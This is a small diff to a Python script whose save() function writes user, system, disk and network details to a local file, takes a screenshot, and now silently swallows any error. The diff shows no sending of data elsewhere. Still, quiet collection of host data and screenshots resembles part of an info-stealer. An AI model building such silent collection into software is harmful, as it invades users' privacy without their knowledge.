@@ -75,8 +75,11 @@ def screenshot():
 
 #print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
 def save():
-    with open("system.txt", "w",encoding="utf-8") as f:
-        f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
-    screenshot()
+    try:
+        with open("system.txt", "w",encoding="utf-8") as f:
+            f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
+        screenshot()
+    except:
+        pass
         
 #save()
